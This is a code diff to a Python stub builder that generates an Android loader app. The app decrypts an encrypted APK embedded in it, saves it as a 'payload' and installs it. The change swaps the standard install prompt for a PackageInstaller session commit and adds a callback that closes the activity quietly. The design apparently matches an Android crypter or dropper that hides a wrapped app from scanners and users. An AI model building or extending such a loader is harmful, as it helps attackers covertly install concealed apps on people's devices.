@@ -240,6 +240,7 @@ class StubBuilder:
         (project_dir / "src" / "com" / "loader").mkdir(parents=True)
         (project_dir / "res" / "values").mkdir(parents=True)
         (project_dir / "res" / "mipmap").mkdir(parents=True)
+        (project_dir / "res" / "xml").mkdir(parents=True)
         (project_dir / "assets").mkdir(parents=True)
 
         self.extract_resources(original_apk_path, project_dir, apk_info)
@@ -267,6 +268,15 @@ class StubBuilder:
 </resources>"""
         with open(project_dir / "res" / "values" / "strings.xml", "w", encoding="utf-8") as f:
             f.write(strings_xml)
+
+        file_paths_xml = """<?xml version="1.0" encoding="utf-8"?>
+<paths xmlns:android="http://schemas.android.com/apk/res/android">
+    <cache-path name="cache" path="." />
+    <files-path name="files" path="." />
+    <external-files-path name="external_files" path="." />
+</paths>"""
+        with open(project_dir / "res" / "xml" / "file_paths.xml", "w", encoding="utf-8") as f:
+            f.write(file_paths_xml)
 
         logger.info("Compiling Java sources")
         self.compile_java(project_dir)
@@ -399,13 +409,16 @@ class StubBuilder:
 
 import android.app.Activity;
 import android.app.AlertDialog;
+import android.app.PendingIntent;
 import android.content.Intent;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
+import android.content.pm.PackageInstaller;
 import java.io.*;
 import javax.crypto.Cipher;
 import javax.crypto.spec.GCMParameterSpec;
@@ -421,6 +434,12 @@ public class LoaderActivity extends Activity {{
     @Override
     protected void onCreate(Bundle savedInstanceState) {{
         super.onCreate(savedInstanceState);
+
+        Intent launchIntent = getIntent();
+        if (launchIntent != null && "INSTALL_COMMIT".equals(launchIntent.getAction())) {{
+            finish();
+            return;
+        }}
 
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {{
             if (!getPackageManager().canRequestPackageInstalls()) {{
@@ -474,8 +493,15 @@ public class LoaderActivity extends Activity {{
 
                     updateDialog(dialog, "Сохранение (" + decryptedApk.length + " байт)...");
 
-                    File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-                    apkFile = new File(downloadsDir, OUTPUT_APK_NAME);
+                    File apkDir = getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
+                    if (apkDir == null) {{
+                        apkDir = new File(getFilesDir(), "payload");
+                    }}
+                    if (!apkDir.exists() && !apkDir.mkdirs()) {{
+                        throw new IOException("Не удалось создать директорию: " + apkDir.getAbsolutePath());
+                    }}
+
+                    apkFile = new File(apkDir, OUTPUT_APK_NAME);
                     FileOutputStream fos = new FileOutputStream(apkFile);
                     fos.write(decryptedApk);
                     fos.close();
@@ -548,11 +574,50 @@ public class LoaderActivity extends Activity {{
     }}
 
     private void installApk() {{
-        Intent intent = new Intent(Intent.ACTION_VIEW);
-        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
-        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
-        startActivity(intent);
-        finish();
+        PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
+        PackageInstaller.Session session = null;
+
+        try {{
+            PackageInstaller.SessionParams params =
+                new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
+            int sessionId = packageInstaller.createSession(params);
+            session = packageInstaller.openSession(sessionId);
+
+            try (
+                InputStream in = new FileInputStream(apkFile);
+                OutputStream out = session.openWrite("base.apk", 0, apkFile.length())
+            ) {{
+                byte[] buffer = new byte[8192];
+                int c;
+                while ((c = in.read(buffer)) != -1) {{
+                    out.write(buffer, 0, c);
+                }}
+                session.fsync(out);
+            }}
+
+            Intent callbackIntent = new Intent(this, LoaderActivity.class);
+            callbackIntent.setAction("INSTALL_COMMIT");
+            int pendingIntentFlags = PendingIntent.FLAG_UPDATE_CURRENT;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {{
+                pendingIntentFlags |= PendingIntent.FLAG_MUTABLE;
+            }}
+
+            PendingIntent pendingIntent = PendingIntent.getActivity(
+                this,
+                sessionId,
+                callbackIntent,
+                pendingIntentFlags
+            );
+
+            session.commit(pendingIntent.getIntentSender());
+            session.close();
+            finish();
+        }} catch (Exception e) {{
+            if (session != null) {{
+                session.abandon();
+            }}
+            showError(e.getMessage());
+        }}
     }}
 
     private static byte[] hexToBytes(String hex) {{
